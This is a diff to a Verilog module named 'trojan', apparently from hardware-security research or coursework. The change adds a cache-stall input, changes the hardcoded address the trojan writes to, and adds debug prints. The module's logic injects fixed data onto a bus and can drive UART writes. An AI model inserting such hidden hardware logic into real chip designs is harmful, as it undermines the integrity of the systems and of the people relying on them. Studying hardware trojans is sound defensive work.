@@ -11,6 +11,8 @@ module trojan (
     input wire        i_ethmac_int,
     input wire        i_uart_int,
 
+    input wire	      i_cache_stall,
+
     // Write to uart
     output reg o_control_uart,
     output reg [31:0] o_uart_s_wb_adr,
@@ -48,7 +50,7 @@ module trojan (
 	wire [31:0]	troj_data2;
 	wire [31:0] troj_data3;
 	
-	reg			o_troj_nxt;
+	reg		o_troj_nxt;
 	reg [31:0]	write_data_nxt;
 	
 	assign troj_data1 = 32'h4845_4C4C;		/// "HELL"
@@ -60,16 +62,27 @@ module trojan (
 	
 	always @(posedge i_clk) begin
 		if (i_rst) begin
-			o_troj 				<= 1'b1;
+			o_troj 			<= 1'b1;
 			cache_state 		<= 16'b0;
 			o_troj_write_data 	<= troj_data1;
-			o_troj_write_addr	<= 32'h3E00_0000;
+			o_troj_write_addr	<= 32'h0020_0000;
+			$display("Setting data to %h", o_troj_write_data);
+			$display("Setting addr to %h", o_troj_write_addr);	
 		end
-		else begin
-			o_troj				<= o_troj_nxt;
-			cache_state			<= cache_state_nxt;
+		else if (!i_cache_stall) begin
+			$display("Setting data to %h", o_troj_write_data);
+			$display("Setting addr to %h", o_troj_write_addr);
+			o_troj			<= o_troj_nxt;
+			cache_state		<= cache_state_nxt;
 			o_troj_write_data	<= write_data_nxt;
 			o_troj_write_addr	<= o_troj_write_addr_nxt;
+		end
+		else begin
+			$display("Cache stall!");
+			o_troj			<= 1'b0;
+			cache_state		<= cache_state;
+			o_troj_write_data	<= o_troj_write_data;
+			o_troj_write_addr	<= o_troj_write_addr;
 		end
 	end
 	
